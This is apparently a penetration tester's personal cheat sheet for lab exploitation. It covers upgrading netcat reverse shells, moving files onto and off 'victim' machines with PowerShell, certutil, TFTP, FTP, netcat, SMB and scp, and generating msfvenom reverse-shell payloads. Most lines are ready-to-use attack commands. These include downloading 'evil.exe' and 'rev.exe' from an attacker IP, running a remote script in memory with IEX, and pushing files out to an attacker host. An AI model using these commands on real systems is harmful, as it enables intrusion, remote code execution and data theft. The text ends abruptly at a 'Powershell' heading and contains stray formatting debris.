# Common
rdesktop -r disk:share=/ <ip> -u username -p <password>
   

## Interactive Shells

Upgrade to Interactive Shells  
python -c 'import pty; pty.spawn("/bin/sh")'  
export TERM=linux
 
/usr/bin/script -qc /bin/bash /dev/null  
export TERM=linux
   

Upgrade rows / cols in interactive shell  
stty rows 200 cols 200
 > From <[https://medium.com/bugbountywriteup/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2](https://medium.com/bugbountywriteup/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2)>     

# Interactive shell for nano, etc
 
When obtaining a reverse shell with a Netcat listener, it is by default non-interactive and you cannot pass keyboard shortcuts or special characters such as tab.
 
It is quite simple to work around. For starters, in your shell, run python -c 'import pty;pty.spawn("/bin/bash");' to obtain a partially interactive bash shell.
 
After that, do CTRL+Z to background Netcat. Enter stty raw -echo in your terminal, which will tell your terminal to pass keyboard shortcuts etc. through. Once that is done, run the command fg to bring Netcat back to the foreground. Note you will not be able to see what you are typing in terminal after you change your stty setting. You should now have tab autocomplete as well as be able to use interactive commands such as su and nano.
 
[https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

## ##Windows

Upload to public if we have very limited command execution and don’t know the directory structure  
C:/Users/Public
 
## PowerShell

Happy Path  
powershell wget [http://192.168.119.177/file.txt](http://192.168.119.177/file.txt) -o file.txt  
powershell curl [http://192.168.119.177/file.txt](http://192.168.119.177/file.txt) -o file.txt  
(Note use Curl with the -OutFile file.txt flag for older Powershell)
 
Download URL  
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
 
Execute a script in Memory  
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.177/helloworld.ps1')
 
Upload File  
powershell.exe (New-Object System.Net.WebClient).UploadFile('http://192.168.119.177/upload.php', 'testme.txt')
 
Older Versions  
powershell Invoke-WebRequest -Uri "[http://www.contoso.com](http://www.contoso.com)" -OutFile "C:\path\file"
 
Windows 7  

```
powershell $client = new-object System.Net.WebClient ; $client.DownloadFile("http://10.10.14.15/winpeas.exe","C:\tmp\winpease.exe")



































$ ftp -n <<EOF
￼
open 
ftp.example.com
￼
user user secret
￼
put my-local-file.txt
￼
EOF








```
 
**Older Version - tested on 2008 R2 in PowerShell Shell**  
$url = "[http://10.10.14.27/rev.exe](http://10.10.14.27/rev.exe)" ; $output = "C:\tmp\rev.exe" ; $wc = New-Object System.Net.WebClient ; $wc.DownloadFile($url, $output)
 
<-- Write file downloader script through echos  
echo $webclient = New-Object System.Net.WebClient >>wget.ps1  
echo $url = "[http://192.168.119.177/evil.exe](http://192.168.119.177/evil.exe)" >>wget.ps1  
echo $file = "new-exploit.exe" >>wget.ps1  
echo $webclient.DownloadFile($url,$file) >>wget.ps1
   

## TFTP

Super old, use netcat or ftp  
tftp -i 192.168.119.177 get nc.exe
 
atftpd --daemon --port 69 /tftp
 
## Certutil

certutil.exe -urlcache -f [http://10.0.0.5/40564.exe](http://10.0.0.5/40564.exe) bad.exe
   

## FTP

On kali, make sure pure-ftpd is running  
service pure-ftpd start
 
echo open 192.168.119.177 21> [ftp.txt](http://ftp.txt)  
echo USER offsec >> [ftp.txt](http://ftp.txt)  
echo lab >> [ftp.txt](http://ftp.txt)  
echo put 1 >> [ftp.txt](http://ftp.txt)  
echo quit >> [ftp.txt](http://ftp.txt)
 
ftp -n -v -s:ftp.txt
 
(Use **put** to Send to Download and **get** to Upload)  
(add bin if needed)
 
## NetCat

nc -w 3 192.168.119.177 1234 < DownloadFIle  
nc -l -p 1234 > DownloadFIle
 
(Reverse to upload file)
 
## TFTP

tftp -I 192.168.119.177 put file.exe
   

## SMB - Temperamental

Start SMB Service on Kali  
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /ftphome -smb2support
 
Drag and drop to the network share, refer to it with the IP eg  
[\\192.168.119.177\share](file:///\\192.168.119.177\share)
 
## Rdesktop

rdesktop -r risk:share=/root/Downloads 192.168.177.10 -u admin -p lab
   

# Linux

## FTP (not yet tested)

$ ftp -n <<EOF￼open [ftp.example.com](http://ftp.example.com)￼user user secret￼put my-local-file.txt￼EOF
 
## NetCat

nc -w 3 192.168.119.177 1234 < DownloadFIle  
nc -l -p 1234 > DownloadFIle
 
## SCP 1 liner

Copy From Victim  
scp text.txt kali@192.168.119.177:/ftphome/file.txt
 
Copy To Victim  
scp root@10.10.10.4:/ftphome/pe.sh /tmp/pe.sh
 
## Cat Pipe

Is another easy way of sending files  
cat /directory/<file> | ssh <user>@<IP> "cat >> directory/file"

# MSF Venom
## Bof

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.20.6 LPORT=443 -f py -a x86 -b "\x00\x0a\x90" --var-name shell EXITFUNC=thread
 
-n if s flag that can be used to enter NOPs into the payload. (Tho the output dosent directly show it as x90)
 
THIS IS VERY HELPFUL IF /x90 IS A BAD CHARACTER
 
## Payloads
 
Powershell
